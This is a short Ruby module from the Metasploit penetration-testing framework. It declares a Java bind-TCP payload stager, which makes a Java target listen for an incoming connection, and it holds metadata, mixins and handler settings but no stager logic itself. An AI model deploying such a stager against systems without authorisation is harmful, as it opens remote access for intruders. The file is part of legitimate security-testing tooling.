##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 5256

  include Msf::Payload::Stager
  include Msf::Payload::Java
  include Msf::Payload::Java::BindTcp

  def initialize(info={})
    super(merge_info(info,
      'Name'        => 'Java Bind TCP Stager',
      'Description' => 'Listen for a connection',
      'Author'      => ['mihi', 'egypt'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'java',
      'Arch'        => ARCH_JAVA,
      'Handler'     => Msf::Handler::BindTcp,
      'Convention'  => 'javasocket',
      'Stager'      => {'Payload' => ''}
    ))
  end
end
